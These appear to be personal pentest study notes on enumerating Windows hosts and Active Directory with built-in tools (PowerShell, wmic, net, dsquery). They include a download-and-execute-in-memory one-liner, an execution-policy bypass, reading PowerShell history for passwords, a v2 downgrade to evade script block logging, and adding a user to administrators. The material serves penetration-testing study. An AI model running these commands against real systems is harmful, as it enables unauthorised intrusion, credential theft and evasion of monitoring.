# Living Off the Land
This way in case i have np attack box just eumerate from client machine cannot install any enumuration tools

---

## Basic Enumeration Commands
Prints the **PC's Name**:
``` powershell
hostname
```
Prints out the **OS version** and **revision level**
``` powershell
[System.Environment]::OSVersion.Version
```
Prints the **patches** and **hotfixes** applied to the host
``` powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
Prints out **network adapter state** and configurations
``` powershell
ipconfig /all
```
Displays a **list of environment variables** for the current session (ran from _CMD_-prompt)
``` powershell
set
```
Displays the **domain name** to which the host belongs (ran from _CMD_-prompt)
``` powershell
echo %USERDOMAIN%
```
Prints out the **name of the Domain controller** the host checks in with (ran from _CMD_-prompt)
``` powershell
echo %logonserver%
```
 We can cover the information above with one command `systeminfo`.

 ---
 
 ## Using built-in modules in PowerShell
 PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

- This Cmdlet **lists all the modules currently loaded** for use in your PowerShell session. Modules contain functions, Cmdlets, and resources that extend PowerShell's capabilities.

```powershell
Get-Module
```

- This Cmdlet displays the execution policy settings for each scope on a host. Execution policies determine the conditions under which PowerShell runs scripts and loads configuration files.
```powershell
Get-ExecutionPolicy -List
```

This Cmdlet temporarily changes the execution policy for the current process using the `-Scope` parameter. The change reverts to its original state after the process ends, making it a safe option for non-permanent adjustments on a host.
```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

This Cmdlet retrieves environment variable values such as key paths, usernames, computer information, and more. It is particularly useful for gathering host-related metadata during assessments.
```powershell
Get-ChildItem Env: | ft Key,Value
```

This Cmdlet fetches the PowerShell history of a specific user. This history can contain useful information, such as commands that reveal passwords, file paths, or configuration details.
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

This command is a quick and efficient way to download and execute a file from the web directly in memory using PowerShell. The `-nop` (No Profile) parameter ensures PowerShell runs without loading the user profile, while `iex` (Invoke-Expression) executes the downloaded content.
```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>'); <follow-on commands>"
```

**Downgrade Powershell**
``` powershell
Get-host
powershell.exe -version 2
```
---

## Examining the PowerShell **Event Log**
The **PowerShell Operational Log** is a valuable source for tracking PowerShell activity on a system. You can find it at:

> `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`

### 🔍 **Key Points to Understand**

1. **Command Logging Location**
    - All PowerShell commands executed during a session are logged here.
    - Another useful log is the **Windows PowerShell Log**, found at:
        
        > `Applications and Services Logs > Windows PowerShell`
        
2. **[Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)**
    
    - When **Script Block Logging** is enabled:
        - Everything typed into the PowerShell terminal is recorded.
        - This helps defenders see the full contents of executed scripts or commands.
    - Documentation: [Microsoft Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)
        
3. **Bypassing Logging via PowerShell V2 Downgrade**
    - Downgrading to **PowerShell version 2.0** disables script block logging.
        - Command used: `powershell.exe -version 2`
    - ⚠️ **However**, this downgrade **is itself logged** in the operational log.
        - A vigilant defender can:
            - See the downgrade command.
            - Notice that logging stops for that session.
            - Investigate the suspicious behavior.
                
4. **Example Log Interpretation**
    
    - Entries **before** the downgrade (e.g., PowerShell V5) appear normally in the log.
    - Once downgraded, a new session starts (e.g., HostVersion 2.0), and detailed logs **stop appearing**—this gap can raise red flags.
---

## Checking Defenses
- **Firewall Checks**
``` powershell
netsh advfirewall show allprofiles
```
- **Windows Defender Check (from CMD.exe)**
``` cmd
sc query windefend
```
- we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.
``` powershell
 Get-MpComputerStatus
```
- **check and see if you are the only one logged in.**
``` powershell
qwinsta
```
---

## Network Information

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

---

## Windows Management Instrumentation (WMI):
[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts.
some useful commands for querying host and domain info using wmic.

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

---

## Net Commands
[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain.
Useful Net Commands

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

---

## Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects.
- **User Search**
``` powershell
dsquery user
```
- **Computer Search**
``` powershell
dsquery computer
```
- We can use a _dsquery_ wildcard search to **view all objects in an OU**:
``` powershell
dsquery * "CN=Users,DC=Domain,DC=LOCAL"
```
- We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.
``` powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
- Searching for **Domain Controllers**
``` powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
**NOTE**: These strings are common LDAP queries that can be used with several different tools too `userAccountControl:1.2.840.113556.1.4.803:=8192`
Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803:=flag` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).  
`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

flags values selected as following
![Pasted image 20250202200443](https://github.com/user-attachments/assets/d7f20e57-7b25-4a5e-8a9a-0c6507bd88dd)

